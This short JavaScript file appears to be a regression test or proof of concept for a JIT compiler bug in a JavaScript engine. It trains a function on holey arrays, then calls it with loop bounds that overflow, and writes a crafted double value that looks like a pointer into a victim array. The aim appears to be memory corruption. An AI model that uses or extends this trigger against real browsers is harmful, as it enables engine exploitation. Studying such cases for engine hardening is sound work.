let length = 0x10;
let arr = [1.1,2.2,3.3,4.4,5.5,6.6,7.7];

let magic = 0x7fffffff;
flag = 0;

let victim = [1.1, 2.2, 3.3];
function jit(arr, start, end, one, victim, changeMe){
    [].slice();

    let arr2 = arr;
    let t = 0;
    for(let i = start;i <=end; i++){
        if(i === magic){
            i = start;
        }
        t = arr2[i];
        if(i === 0x600){
            break;
        }
    }
    victim[1] = 2.2;
    changeMe[0x100] = t;
    victim[0] = 6.17651672645e-312;
}

{
    let tmp = [1.1, 2.2, 3.3];
    delete tmp[1];
    jit(arr, 0, 1, 1, tmp, tmp);
}

delete arr[6];
jit(arr, 0, 0x7fffffff, 1, victim, victim);
print('Pass');
